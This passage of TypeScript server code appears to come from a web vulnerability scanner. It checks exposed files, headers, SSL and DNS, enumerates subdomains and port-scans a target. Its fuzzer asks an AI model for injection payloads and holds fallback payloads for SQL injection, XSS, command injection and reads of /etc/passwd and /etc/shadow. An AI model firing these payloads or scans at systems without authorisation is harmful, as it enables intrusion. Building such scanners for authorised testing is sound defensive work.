              if (xPoweredBy.includes('express')) results.tech.push('Express');

              if (response.socket && (response.socket as any).getPeerCertificate) {
                const cert = (response.socket as any).getPeerCertificate();
                if (cert && Object.keys(cert).length > 0) {
                  const validTo = new Date(cert.valid_to);
                  const isValid = validTo > new Date();
                  results.ssl = {
                    subject: cert.subject,
                    issuer: cert.issuer,
                    valid_from: cert.valid_from,
                    valid_to: cert.valid_to,
                    fingerprint: cert.fingerprint,
                    status: isValid ? "Valid" : "Expired/Invalid",
                    vulnerabilities: []
                  };
                  if (!isValid) results.ssl.vulnerabilities.push("Certificate is expired");
                }
              }
              resolve(null);
            });
            req.on('error', () => resolve(null));
            req.setTimeout(5000, () => { req.destroy(); resolve(null); });
          });
        })(),

        // 4. WHOIS Lookup
        (async () => {
          try {
            const whoisResult = await performWhoisLookup(hostname);
            results.whois = whoisResult || { status: "Data not available" };
          } catch (e) {
            results.whois = { status: "Lookup failed" };
          }
        })(),

        // 5. Sensitive Files
        (async () => {
          const sensitiveFiles = [
            { path: '/.git', title: 'Git Repository Exposed', severity: 'critical' },
            { path: '/.env', title: 'Environment Variables Exposed', severity: 'critical' },
            { path: '/robots.txt', title: 'Robots.txt Analysis', severity: 'info' },
            { path: '/phpinfo.php', title: 'PHP Info Disclosure', severity: 'high' },
            { path: '/.svn', title: 'SVN Repository Exposed', severity: 'high' },
            { path: '/.htaccess', title: 'Htaccess File Exposed', severity: 'medium' }
          ];

          await Promise.all(sensitiveFiles.map(async (file) => {
            try {
              const protocol = target.startsWith('https') ? https : http;
              const url = target.startsWith('http') ? `${target}${file.path}` : `http://${target}${file.path}`;
              const response: any = await new Promise((resolve, reject) => {
                const req = protocol.get(url, resolve);
                req.on('error', reject);
                req.setTimeout(2000, () => { req.destroy(); resolve({ statusCode: 408 }); });
              });
              if (response.statusCode === 200) {
                results.vulnerabilities.push({
                  title: file.title,
                  severity: file.severity as any,
                  category: 'Information Disclosure',
                  description: `The file ${file.path} was found on the server, which can disclose sensitive information.`,
                  remediation: `Restrict access to the ${file.path} file or remove it from the server.`
                });
                if (file.severity === 'critical') score += 30;
                else if (file.severity === 'high') score += 15;
                else if (file.severity === 'medium') score += 5;
              }
            } catch (e) {}
          }));
        })()
      ]);

      // 6. Vulnerability Engine (Rule-based)
      const vulnerabilities = [...results.vulnerabilities];
      let score = 10;

      // Header checks
      const securityHeaders = [
        'content-security-policy',
        'strict-transport-security',
        'x-frame-options',
        'x-content-type-options',
        'referrer-policy',
        'permissions-policy'
      ];
      if (results.headers) {
        securityHeaders.forEach(header => {
          if (!results.headers[header]) {
            vulnerabilities.push({
              title: `Missing Security Header: ${header}`,
              severity: header === 'content-security-policy' ? 'high' : 'medium',
              category: 'Web',
              description: `The ${header} header is missing, which can expose the application to various attacks.`,
              remediation: `Implement the ${header} header with appropriate security policies.`
            });
            score += (header === 'content-security-policy' ? 10 : 5);
          }
        });
      }

      // Port checks
      results.ports.forEach((p: any) => {
        if (p.port === 21 && p.status === 'open') {
          vulnerabilities.push({
            title: "Insecure Protocol: FTP",
            severity: "high",
            category: "Network",
            description: "FTP transmits data in cleartext, including credentials.",
            remediation: "Disable FTP and use SFTP or FTPS instead."
          });
          score += 15;
        }
        if (p.port === 22 && p.status === 'open') {
          vulnerabilities.push({
            title: "Exposed SSH Port",
            severity: "medium",
            category: "Network",
            description: "SSH is exposed to the public internet, increasing brute-force risk.",
            remediation: "Restrict SSH access to specific IP ranges or use a VPN."
          });
          score += 5;
        }
        if (p.port === 23 && p.status === 'open') {
          vulnerabilities.push({
            title: "Insecure Protocol: Telnet",
            severity: "critical",
            category: "Network",
            description: "Telnet transmits data in cleartext, including credentials.",
            remediation: "Disable Telnet and use SSH instead."
          });
          score += 25;
        }
        if (p.port === 3389 && p.status === 'open') {
          vulnerabilities.push({
            title: "Exposed RDP Port",
            severity: "high",
            category: "Network",
            description: "RDP is exposed to the public internet, increasing brute-force risk.",
            remediation: "Restrict RDP access to specific IP ranges or use a VPN."
          });
          score += 10;
        }
        if (p.port === 3306 && p.status === 'open') {
          vulnerabilities.push({
            title: "Exposed MySQL Port",
            severity: "high",
            category: "Database",
            description: "MySQL is exposed to the public internet.",
            remediation: "Restrict MySQL access to specific IP ranges or use a VPN."
          });
          score += 10;
        }
      });

      // SSL checks
      if (results.ssl) {
        const expiry = new Date(results.ssl.valid_to);
        if (expiry < new Date()) {
          vulnerabilities.push({
            title: "Expired SSL Certificate",
            severity: "critical",
            category: "SSL/TLS",
            description: "The SSL certificate for this domain has expired.",
            remediation: "Renew the SSL certificate immediately."
          });
          score += 30;
        } else {
          const daysLeft = Math.floor((expiry.getTime() - new Date().getTime()) / (1000 * 60 * 60 * 24));
          if (daysLeft < 30) {
            vulnerabilities.push({
              title: "SSL Certificate Expiring Soon",
              severity: "medium",
              category: "SSL/TLS",
              description: `The SSL certificate for this domain will expire in ${daysLeft} days.`,
              remediation: "Renew the SSL certificate soon."
            });
            score += 5;
          }
        }
      } else if (target.startsWith('https')) {
        vulnerabilities.push({
          title: "SSL/TLS Handshake Failure",
          severity: "high",
          category: "SSL/TLS",
          description: "Could not establish a secure connection to the target.",
          remediation: "Check certificate validity and server configuration."
        });
        score += 20;
      }

      results.vulnerabilities = vulnerabilities;
      results.riskScore = Math.min(100, score);
      results.summary = `Scan completed for ${target}. Found ${vulnerabilities.length} potential security issues.`;
      results.recommendations = vulnerabilities.map(v => v.remediation).slice(0, 5);

    } catch (error) {
      console.error("[Scanner] Global scan error:", error);
      results.error = "Scan failed";
    }

    res.json(results);
  });

  function getServiceName(port: number) {
    const services: any = {
      21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
      80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
      465: 'SMTPS', 587: 'SMTP-Submission', 993: 'IMAPS', 995: 'POP3S',
      1433: 'MSSQL', 1521: 'Oracle', 2049: 'NFS', 3000: 'CyberSuite-API', 3306: 'MySQL',
      3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
      8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 9000: 'PHP-FPM',
      9200: 'Elasticsearch', 27017: 'MongoDB'
    };
    return services[port] || 'Unknown';
  }

  // Tool-specific endpoints
  const scanCache = new Map<string, { data: any, timestamp: number }>();
  const CACHE_TTL = 1000 * 60 * 5; // 5 minutes

  app.get("/api/tools/:tool", async (req, res) => {
    const { tool } = req.params;
    const target = req.query.target as string;
    if (!target) return res.status(400).json({ error: "Target required" });

    const cacheKey = `${tool}:${target}`;
    if (scanCache.has(cacheKey)) {
      const cached = scanCache.get(cacheKey)!;
      if (Date.now() - cached.timestamp < CACHE_TTL) {
        console.log(`[Scanner] Returning cached result for ${cacheKey}`);
        return res.json(cached.data);
      }
    }

    const hostname = target.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];

    let result: any;
    switch (tool) {
      case 'subdomains':
        if (net.isIP(hostname) || hostname === 'localhost' || hostname === '127.0.0.1') {
          result = [{ subdomain: hostname, ip: hostname === 'localhost' ? '127.0.0.1' : hostname, status: 'up', type: 'A' }];
          break;
        }

        let searchDomain = hostname;
        if (searchDomain.startsWith('www.')) {
          searchDomain = searchDomain.substring(4);
        }

        const foundSubdomains: any[] = [];
        const uniqueSubs = new Set<string>();
        const resolvedSubs = new Set<string>();

        // 1. Common subdomains dictionary
        const commonSubs = [
          'www', 'mail', 'dev', 'api', 'staging', 'blog', 'vpn', 'ns1', 'ns2', 'mx',
          'shop', 'store', 'app', 'portal', 'admin', 'test', 'demo', 'support', 'help',
          'docs', 'beta', 'static', 'assets', 'img', 'cdn', 'cloud', 'remote', 'secure',
          'login', 'auth', 'account', 'profile', 'dashboard', 'internal', 'corp', 'staff',
          'ftp', 'smtp', 'pop', 'imap', 'webmail', 'autodiscover', 'cpanel', 'whm', 'webdisk',
          'm', 'mobile', 'news', 'forum', 'client', 'clients', 'billing', 'panel', 'manage',
          'git', 'svn', 'dev-api', 'api-dev', 'test-api', 'api-test', 'v1', 'v2', 'v3',
          'status', 'monitor', 'monitoring', 'zabbix', 'nagios', 'grafana', 'prometheus',
          'jenkins', 'gitlab', 'docker', 'registry', 'k8s', 'kubernetes', 'cluster',
          'db', 'database', 'sql', 'mysql', 'postgres', 'redis', 'elastic', 'mongo',
          'search', 'files', 'upload', 'download', 'media', 'images', 'videos', 'assets1', 'assets2',
          'dev1', 'dev2', 'dev3', 'qa', 'uat', 'prod', 'production', 'sandbox', 'preprod',
          'api1', 'api2', 'api3', 'web', 'web1', 'web2', 'web3', 'app1', 'app2', 'app3',
          'mail1', 'mail2', 'mail3', 'smtp1', 'smtp2', 'smtp3', 'pop1', 'pop2', 'pop3',
          'imap1', 'imap2', 'imap3', 'ftp1', 'ftp2', 'ftp3', 'ssh', 'vpn1', 'vpn2', 'vpn3',
          'proxy', 'proxy1', 'proxy2', 'proxy3', 'loadbalancer', 'lb', 'gateway', 'gw',
          'firewall', 'fw', 'router', 'switch', 'hub', 'bridge', 'dns1', 'dns2', 'dns3',
          'ns', 'ns3', 'ns4', 'mx1', 'mx2', 'mx3', 'txt', 'spf', 'dkim', 'dmarc',
          'devops', 'sysadmin', 'root', 'super', 'manager', 'owner', 'user', 'users',
          'customer', 'customers', 'partner', 'partners', 'vendor', 'vendors', 'supplier',
          'suppliers', 'employee', 'employees', 'hr', 'finance', 'accounting', 'legal',
          'marketing', 'sales', 'support1', 'support2', 'helpdesk', 'service', 'services',
          'api-gateway', 'gateway-api', 'microservice', 'microservices', 'service1', 'service2',
          'node1', 'node2', 'node3', 'server1', 'server2', 'server3', 'host1', 'host2', 'host3'
        ];
        
        const dictionarySubs = commonSubs.map(sub => `${sub}.${searchDomain}`);
        dictionarySubs.push(searchDomain);

        // 2. Start resolving dictionary subdomains immediately
        const resolveBatch = async (subs: string[]) => {
          const limit = pLimit(10); // Limit to 10 concurrent lookups
          await Promise.all(subs.map(domain => limit(async () => {
            if (resolvedSubs.has(domain)) return;
            try {
              // Add a 2s timeout for each DNS lookup to prevent hanging
              const lookup = await Promise.race([
                dns.promises.lookup(domain),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
              ]) as any;
              
              if (lookup && lookup.address) {
                foundSubdomains.push({ 
                  subdomain: domain, 
                  ip: lookup.address, 
                  status: 'up', 
                  type: lookup.family === 6 ? 'AAAA' : 'A',
                  last_seen: new Date().toISOString()
                });
              }
            } catch (e) {}
            resolvedSubs.add(domain);
          })));
        };

        // 3. Start crt.sh fetch, HackerTarget fetch, and dictionary resolution in parallel
        console.log(`[Scanner] Starting parallel subdomain discovery for ${searchDomain}...`);
        
        const hackerTargetPromise = (async () => {
          try {
            const htUrl = `https://api.hackertarget.com/hostsearch/?q=${searchDomain}`;
            const response = await axios.get(htUrl, { timeout: 8000 });
            if (response.status === 200 && typeof response.data === 'string') {
              const lines = response.data.split('\n');
              const newSubs = new Set<string>();
              lines.forEach(line => {
                const parts = line.split(',');
                if (parts[0] && parts[0].endsWith(searchDomain)) {
                  newSubs.add(parts[0].toLowerCase());
                }
              });
              if (newSubs.size > 0) {
                console.log(`[Scanner] HackerTarget found ${newSubs.size} unique subdomains, resolving...`);
                await resolveBatch(Array.from(newSubs));
              }
            }
          } catch (e: any) {
            console.warn(`[Scanner] HackerTarget fetch skipped/failed (${e.message}).`);
          }
        })();

        const crtShPromise = (async () => {
          try {
            const crtUrl = `https://crt.sh/?q=%.${searchDomain}&output=json`;
            const response = await axios.get(crtUrl, {
              timeout: 10000, // Reduced to 10s to prevent long hangs
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
              },
              validateStatus: () => true
            });

            if (response.status === 200 && response.data) {
              const certs = response.data;
              if (Array.isArray(certs)) {
                const newSubs = new Set<string>();
                certs.forEach((cert: any) => {
                  const nameValue = cert.name_value.toLowerCase();
                  nameValue.split('\n').forEach((sub: string) => {
                    const cleanSub = sub.trim();
                    if (cleanSub && !cleanSub.includes('*') && cleanSub.endsWith(searchDomain) && !resolvedSubs.has(cleanSub)) {
                      newSubs.add(cleanSub);
                    }
                  });
                });
                
                if (newSubs.size > 0) {
                  console.log(`[Scanner] crt.sh found ${newSubs.size} unique subdomains, resolving...`);
                  await resolveBatch(Array.from(newSubs));
                }
              }
            }
          } catch (e: any) {
            // Suppress crt.sh timeout/failure warnings to reduce log noise
          }
        })();

        // Run all discovery methods in parallel
        await Promise.all([
          resolveBatch(dictionarySubs),
          hackerTargetPromise,
          crtShPromise
        ]);

        if (foundSubdomains.length === 0) {
          console.warn(`[Scanner] No subdomains found for ${searchDomain}. Using fallback.`);
          foundSubdomains.push({ subdomain: searchDomain, ip: 'Unknown', status: 'down', type: 'A' });
        } else {
          console.log(`[Scanner] Found ${foundSubdomains.length} total subdomains for ${searchDomain}.`);
        }
        
        // Sort by subdomain name
        foundSubdomains.sort((a, b) => a.subdomain.localeCompare(b.subdomain));
        
        result = foundSubdomains;
        break;

      case 'ports':
        const commonPorts = [
          21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587, 993, 995, 1433, 1521, 
          2049, 3000, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 9200, 27017
        ];
        const portResults: any[] = [];
        
        // Use 127.0.0.1 for localhost to avoid IPv6 issues
        const scanHost = (hostname === 'localhost') ? '127.0.0.1' : hostname;
        
        const limit = pLimit(20); // Limit to 20 concurrent port scans
        await Promise.all(commonPorts.map(port => limit(() => {
          return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(1500);
            socket.on('connect', () => {
              console.log(`[Scanner] Port ${port} is open on ${scanHost}`);
              
              // Attempt banner grabbing for open ports
              let banner = '';
              const bannerSocket = new net.Socket();
              bannerSocket.setTimeout(2000);
              bannerSocket.connect(port, scanHost, () => {
                // Some services send banner on connect (SSH, FTP)
              });
              
              bannerSocket.on('data', (data) => {
                banner = data.toString().trim().substring(0, 100);
                bannerSocket.destroy();
              });
              
              bannerSocket.on('error', () => bannerSocket.destroy());
              bannerSocket.on('timeout', () => bannerSocket.destroy());
              
              // Wait a bit for banner
              setTimeout(() => {
                portResults.push({ 
                  port, 
                  service: getServiceName(port), 
                  state: 'open', 
                  version: banner ? 'Detected' : 'Unknown',
                  banner: banner || '' 
                });
                socket.destroy();
                bannerSocket.destroy();
                resolve(null);
              }, 1000);
            });
            socket.on('timeout', () => {
              console.log(`[Scanner] Port ${port} timed out on ${scanHost}`);
              portResults.push({ port, service: getServiceName(port), state: 'filtered', version: 'Unknown' });
              socket.destroy();
              resolve(null);
            });
            socket.on('error', (err) => {
              console.log(`[Scanner] Port ${port} error on ${scanHost}:`, err.message);
              portResults.push({ port, service: getServiceName(port), state: 'closed', version: 'Unknown' });
              socket.destroy();
              resolve(null);
            });
            socket.connect(port, scanHost);
          });
        })));
        result = portResults.sort((a, b) => a.port - b.port);
        break;

      case 'headers':
        try {
          const url = target.startsWith('http') ? target : `http://${target}`;
          const agent = new https.Agent({ rejectUnauthorized: false });
          
          const response = await axios.get(url, {
            httpsAgent: agent,
            timeout: 10000,
            maxRedirects: 5,
            validateStatus: () => true // Accept all status codes
          });
          
          const headers = response.headers;
          const analysis: any = {
            security: {},
            disclosure: {},
            cookies: [],
            score: 0,
            totalChecks: 0,
            passedChecks: 0
          };

          const securityHeaders = {
            'Content-Security-Policy': { 
              rec: 'Implement a strong CSP to prevent XSS and data injection.', 
              severity: 'high',
              check: (val: string) => {
                if (!val) return { status: 'missing', score: 0, detail: '' };
                if (val.includes('unsafe-inline') || val.includes('unsafe-eval')) {
                  return { status: 'warning', score: 5, detail: 'CSP present but allows unsafe-inline or unsafe-eval.' };
                }
                return { status: 'secure', score: 10, detail: '' };
              }
            },
            'Strict-Transport-Security': { 
              rec: 'Enable HSTS to force HTTPS connections.', 
              severity: 'medium',
              check: (val: string) => {
                if (!val) return { status: 'missing', score: 0, detail: '' };
                if (!val.includes('max-age')) return { status: 'warning', score: 5, detail: 'HSTS present but missing max-age.' };
                return { status: 'secure', score: 10, detail: '' };
              }
            },
            'X-Frame-Options': { 
              rec: 'Set to DENY or SAMEORIGIN to prevent clickjacking.', 
              severity: 'medium',
              check: (val: string) => {
                if (!val) return { status: 'missing', score: 0, detail: '' };
                const v = val.toUpperCase();
                if (v === 'DENY' || v === 'SAMEORIGIN') return { status: 'secure', score: 10, detail: '' };
                return { status: 'warning', score: 5, detail: 'X-Frame-Options set to insecure value.' };
              }
            },
            'X-Content-Type-Options': { 
              rec: 'Set to nosniff to prevent MIME sniffing.', 
              severity: 'low',
              check: (val: string) => {
                if (!val) return { status: 'missing', score: 0, detail: '' };
                if (val.toLowerCase() === 'nosniff') return { status: 'secure', score: 10, detail: '' };
                return { status: 'warning', score: 5, detail: 'X-Content-Type-Options set to insecure value.' };
              }
            },
            'Referrer-Policy': { 
              rec: 'Set to strict-origin-when-cross-origin to protect user privacy.', 
              severity: 'low',
              check: (val: string) => {
                if (!val) return { status: 'missing', score: 0, detail: '' };
                const secureValues = ['no-referrer', 'no-referrer-when-downgrade', 'origin', 'origin-when-cross-origin', 'same-origin', 'strict-origin', 'strict-origin-when-cross-origin'];
                if (secureValues.includes(val.toLowerCase())) return { status: 'secure', score: 10, detail: '' };
                return { status: 'warning', score: 5, detail: 'Referrer-Policy set to potentially insecure value.' };
              }
            },
            'Permissions-Policy': { 
              rec: 'Define browser feature permissions to reduce attack surface.', 
              severity: 'low',
              check: (val: string) => {
                if (!val) return { status: 'missing', score: 0, detail: '' };
                return { status: 'secure', score: 10, detail: '' };
              }
            },
            'X-XSS-Protection': { 
              rec: 'Deprecated but still useful for older browsers. Set to 1; mode=block.', 
              severity: 'info',
              check: (val: string) => {
                if (!val) return { status: 'missing', score: 0, detail: '' };
                if (val.includes('1; mode=block')) return { status: 'secure', score: 10, detail: '' };
                return { status: 'warning', score: 5, detail: 'X-XSS-Protection present but not in block mode.' };
              }
            }
          };

          Object.entries(securityHeaders).forEach(([h, config]) => {
            const val = headers[h.toLowerCase()];
            const checkResult = config.check(val);
            analysis.totalChecks++;
            if (checkResult.status === 'secure') analysis.passedChecks++;
            analysis.score += checkResult.score;

            analysis.security[h] = {
              value: val || 'Missing',
              status: checkResult.status,
              severity: checkResult.status === 'secure' ? 'none' : (checkResult.status === 'warning' ? 'low' : config.severity),
              recommendation: checkResult.status === 'secure' ? 'None' : config.rec,
              detail: checkResult.detail || ''
            };
          });
          
          // Check for sensitive headers (Information Disclosure)
          const sensitiveHeaders = ['server', 'x-powered-by', 'x-aspnet-version', 'via', 'x-cache', 'x-generator'];
          sensitiveHeaders.forEach(h => {
            const val = headers[h.toLowerCase()];
            if (val) {
              analysis.disclosure[h] = {
                value: val,
                status: 'vulnerable',
                severity: 'low',
                recommendation: `Information disclosure: Hide the '${h}' header to reduce attack surface.`
              };
            }
          });

          // Cookie analysis
          const setCookies = headers['set-cookie'];
          if (setCookies) {
            setCookies.forEach(cookie => {
              const parts = cookie.split(';').map(p => p.trim());
              const name = parts[0].split('=')[0];
              const isSecure = parts.some(p => p.toLowerCase() === 'secure');
              const isHttpOnly = parts.some(p => p.toLowerCase() === 'httponly');
              const sameSite = parts.find(p => p.toLowerCase().startsWith('samesite='))?.split('=')[1] || 'None';

              analysis.cookies.push({
                name,
                secure: isSecure,
                httpOnly: isHttpOnly,
                sameSite,
                status: (isSecure && isHttpOnly) ? 'secure' : 'warning',
                recommendation: `${!isSecure ? 'Missing Secure flag. ' : ''}${!isHttpOnly ? 'Missing HttpOnly flag.' : ''}`
              });
            });
          }

          // Calculate final percentage score
          analysis.overallScore = Math.round((analysis.score / (analysis.totalChecks * 10)) * 100);
          
          result = analysis;
        } catch (e: any) {
          return res.status(500).json({ error: e.message });
        }
        break;

      case 'dns':
        if (hostname === 'localhost' || hostname === '127.0.0.1') {
          const os = await import('os');
          const networkInterfaces = os.networkInterfaces();
          const localIps = Object.values(networkInterfaces)
            .flat()
            .filter((details: any) => details.family === 'IPv4' && !details.internal)
            .map((details: any) => details.address);

          result = {
            records: {
              'A': ['127.0.0.1'],
              'Local IPs': localIps,
              'Hostname': [os.hostname()],
              'Platform': [os.platform()],
              'Status': ['Localhost detected - Standard DNS resolution skipped.']
            },
            security: {
              'DNSSEC': { status: 'n/a', detail: 'Not applicable for localhost' },
              'SPF': { status: 'n/a', detail: 'Not applicable for localhost' },
              'DMARC': { status: 'n/a', detail: 'Not applicable for localhost' },
              'CAA': { status: 'n/a', detail: 'Not applicable for localhost' }
            }
          };
          break;
        }
        const dnsRecords: any = {};
        const recordTypes: { type: keyof typeof dns.promises; label: string }[] = [
          { type: 'resolve4', label: 'A' },
          { type: 'resolve6', label: 'AAAA' },
          { type: 'resolveMx', label: 'MX' },
          { type: 'resolveNs', label: 'NS' },
          { type: 'resolveTxt', label: 'TXT' },
          { type: 'resolveSoa', label: 'SOA' },
          { type: 'resolveCname', label: 'CNAME' },
          { type: 'resolveSrv', label: 'SRV' },
          { type: 'resolveCaa', label: 'CAA' }
        ];
        
        const resolveDNS = async (host: string) => {
          const limit = pLimit(5); // Limit to 5 concurrent DNS lookups
          await Promise.all(recordTypes.map(async ({ type, label }) => limit(async () => {
            try {
              const method = dns.promises[type] as Function;
              // Add a 3s timeout for each DNS lookup
              const res = await Promise.race([
                method(host),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
              ]);
              if (res && (Array.isArray(res) ? res.length > 0 : true)) {
                dnsRecords[label] = res;
              }
            } catch (e) {
              // Record type not found or timeout
            }
          })));
        };

        await resolveDNS(hostname);

        // If no records found and it's a www subdomain, try the root domain
        if (Object.keys(dnsRecords).length === 0 && hostname.startsWith('www.')) {
          const rootDomain = hostname.substring(4);
          await resolveDNS(rootDomain);
        }

        // Security Analysis
        const securityAnalysis: any = {
          'DNSSEC': { status: 'unknown', detail: 'Could not verify DNSSEC status.' },
          'SPF': { status: 'missing', detail: 'No SPF record found. Risk of email spoofing.' },
          'DMARC': { status: 'missing', detail: 'No DMARC record found. Risk of domain impersonation.' },
          'CAA': { status: 'missing', detail: 'No CAA record found. Any CA can issue certificates for this domain.' }
        };

        // Analyze TXT records for SPF and DMARC
        if (dnsRecords['TXT']) {
          const txtRecords = dnsRecords['TXT'].flat();
          const spf = txtRecords.find((r: string) => r.startsWith('v=spf1'));
          if (spf) {
            securityAnalysis['SPF'] = { 
              status: 'secure', 
              detail: 'SPF record detected.',
              value: spf
            };
          }

          // DMARC is usually on _dmarc.domain
          try {
            const dmarcRes = await dns.promises.resolveTxt(`_dmarc.${hostname}`);
            const dmarc = dmarcRes.flat().find((r: string) => r.startsWith('v=DMARC1'));
            if (dmarc) {
              securityAnalysis['DMARC'] = { 
                status: 'secure', 
                detail: 'DMARC record detected.',
                value: dmarc
              };
            }
          } catch (e) {
            // No DMARC
          }
        }

        // Analyze CAA
        if (dnsRecords['CAA']) {
          securityAnalysis['CAA'] = { 
            status: 'secure', 
            detail: 'CAA records found, restricting certificate issuance.',
            value: JSON.stringify(dnsRecords['CAA'])
          };
        }

        // DNSSEC check (simplified)
        if (dnsRecords['SOA']) {
          securityAnalysis['DNSSEC'] = { 
            status: 'info', 
            detail: 'SOA record present. DNSSEC requires deeper inspection of RRSIG/DNSKEY records.' 
          };
        }

        result = {
          records: dnsRecords,
          security: securityAnalysis
        };
        break;

      case 'ssl':
        if (hostname === 'localhost' || hostname === '127.0.0.1') {
          result = {
            subject: { CN: 'localhost' },
            issuer: { CN: 'Self-Signed (Local Development)' },
            valid_from: new Date().toISOString(),
            valid_to: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
            fingerprint: 'LOCAL-CERT-FINGERPRINT',
            status: "Internal/Self-Signed",
            grade: "A",
            vulnerabilities: ["Local development environment detected"],
            protocol: "TLSv1.3",
            cipher: "TLS_AES_256_GCM_SHA384",
            hsts: { enabled: false, detail: "HSTS not recommended for local development" },
            details: {
              keyType: "RSA (2048 bits)",
              serialNumber: "00:DE:AD:BE:EF",
              sigAlg: "sha256WithRSAEncryption"
            }
          };
          break;
        }
        try {
          const options = {
            host: hostname,
            port: 443,
            method: 'GET',
            rejectUnauthorized: false,
          };
          
          result = await new Promise((resolve, reject) => {
            const req = https.request(options, (httpsRes) => {
              const cert = (httpsRes.socket as any).getPeerCertificate(true);
              const cipher = (httpsRes.socket as any).getCipher ? (httpsRes.socket as any).getCipher() : null;
              const protocol = (httpsRes.socket as any).getProtocol ? (httpsRes.socket as any).getProtocol() : 'Unknown';
              const hstsHeader = httpsRes.headers['strict-transport-security'];

              if (cert && Object.keys(cert).length > 0) {
                const validTo = new Date(cert.valid_to);
                const isValid = validTo > new Date();
                const vulnerabilities: string[] = [];
                let grade = "A";

                if (!isValid) {
                  vulnerabilities.push("Certificate is expired");
                  grade = "F";
                }
                
                if (cert.sigalg && (cert.sigalg.includes('md5') || cert.sigalg.includes('sha1'))) {
                  vulnerabilities.push(`Weak signature algorithm: ${cert.sigalg}`);
                  grade = grade === "F" ? "F" : "C";
                }

                if (protocol === 'TLSv1' || protocol === 'TLSv1.1' || protocol === 'SSLv3' || protocol === 'SSLv2') {
                  vulnerabilities.push(`Insecure protocol version: ${protocol}`);
                  grade = "F";
                }

                if (cipher && (cipher.bits < 128)) {
                  vulnerabilities.push(`Weak cipher strength: ${cipher.name} (${cipher.bits} bits)`);
                  grade = grade === "F" ? "F" : "C";
                }

                const sslData = {
                  subject: cert.subject,
                  issuer: cert.issuer,
                  valid_from: cert.valid_from,
                  valid_to: cert.valid_to,
                  fingerprint: cert.fingerprint,
                  status: grade === "F" ? "Expired/Invalid" : (grade === "C" ? "Weak" : "Valid"),
                  grade: grade,
                  vulnerabilities: vulnerabilities,
                  cipher: cipher ? `${cipher.name} (${cipher.bits} bits)` : 'Unknown',
                  protocol: protocol,
                  hsts: {
                    enabled: !!hstsHeader,
                    detail: hstsHeader ? `HSTS enabled: ${hstsHeader}` : "HSTS not enabled. Risk of protocol downgrade attacks."
                  },
                  details: {
                    keyType: cert.pubkey ? `${cert.pubkey.type || 'Unknown'} (${cert.bits || 'Unknown'} bits)` : 'Unknown',
                    serialNumber: cert.serialNumber,
                    sigAlg: cert.sigalg,
                    asn1Curve: cert.asn1Curve,
                    nistCurve: cert.nistCurve
                  }
                };
                
                httpsRes.destroy();
                resolve(sslData);
              } else {
                httpsRes.destroy();
                reject(new Error("No certificate found"));
              }
            });
            
            req.on('error', reject);
            req.setTimeout(5000, () => { req.destroy(); reject(new Error("Timeout")); });
            req.end();
          });
        } catch (e: any) {
          return res.status(500).json({ error: `SSL analysis failed: ${e.message}` });
        }
        break;

      case 'fuzzer':
        try {
          const fuzzerTarget = req.query.target as string || '';
          const fuzzerApiKey = process.env.GEMINI_API_KEY;
          let fuzzerPayloads: any[] = [];

          if (isValidApiKey(fuzzerApiKey)) {
            try {
              const ai = new GoogleGenAI({ apiKey: fuzzerApiKey! });
              const fuzzResponse = await ai.models.generateContent({
                model: "gemini-3-flash-preview",
                contents: `Generate 10 advanced fuzzing payloads for the target: ${fuzzerTarget}.
                The payloads should target various vulnerabilities like SQLi, XSS, Path Traversal, and Command Injection.
                Return a JSON array of objects, each with:
                - 'payload': The actual malformed string to inject.
                - 'type': The vulnerability type (e.g., 'SQLi', 'XSS', 'Path Traversal').
                - 'description': What this payload is testing.`,
                config: { responseMimeType: "application/json" }
              });
              const generated = JSON.parse(fuzzResponse.text || '[]');
              fuzzerPayloads = generated.map((p: any) => p.payload);
            } catch (e) {
              console.error("[Scanner] AI Payload generation failed, using defaults", e);
              fuzzerPayloads = ["' OR 1=1 --", "<script>alert(1)</script>", "../../../etc/passwd", "'; id", "admin'--", "<img src=x onerror=alert(1)>", "/etc/shadow", "|| whoami"];
            }
          } else {
            fuzzerPayloads = ["' OR 1=1 --", "<script>alert(1)</script>", "../../../etc/passwd", "'; id", "admin'--", "<img src=x onerror=alert(1)>", "/etc/shadow", "|| whoami"];
          }

          const fuzzerResults: any[] = [];
          const agent = new https.Agent({ rejectUnauthorized: false });

          await Promise.all(fuzzerPayloads.slice(0, 8).map(async (payload) => {
            try {
              const testUrl = fuzzerTarget.includes('?') 
                ? `${fuzzerTarget}${payload}` 
                : `${fuzzerTarget}?input=${encodeURIComponent(payload)}`;
              
              const finalUrl = testUrl.startsWith('http') ? testUrl : `http://${testUrl}`;
              const start = Date.now();
              
              const response = await axios.get(finalUrl, {
                httpsAgent: agent,
                timeout: 5000,
                validateStatus: () => true // Accept all status codes
              });
              
              const duration = Date.now() - start;
              const responseText = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
              
              let anomalyType = 'None';
              let riskLevel = 'low';
              
              if (response.status === 500) {
                anomalyType = 'Server Error (Potential Crash)';
                riskLevel = 'high';
              } else if (duration > 3000) {
                anomalyType = 'Time Delay (Potential Blind Injection)';
                riskLevel = 'medium';
              } else if (responseText.includes('sql syntax') || responseText.includes('mysql_fetch_array')) {
                anomalyType = 'Database Error (SQLi Leak)';
                riskLevel = 'critical';
              } else if (responseText.includes('root:x:0:0')) {
                anomalyType = 'File Disclosure (LFI)';
                riskLevel = 'critical';
              } else if (responseText.includes('<script>alert(1)</script>')) {
                anomalyType = 'Reflected Content (XSS)';
                riskLevel = 'high';
              }

              fuzzerResults.push({
                payload,
                response_code: response.status,
                response_time: `${duration}ms`,
                anomaly_type: anomalyType,
                risk_level: riskLevel
              });
            } catch (e: any) {
              fuzzerResults.push({
                payload,
                response_code: 'ERR',
                response_time: 'N/A',
                anomaly_type: 'Connection Refused',
                risk_level: 'low'
              });
            }
          }));

          result = fuzzerResults;
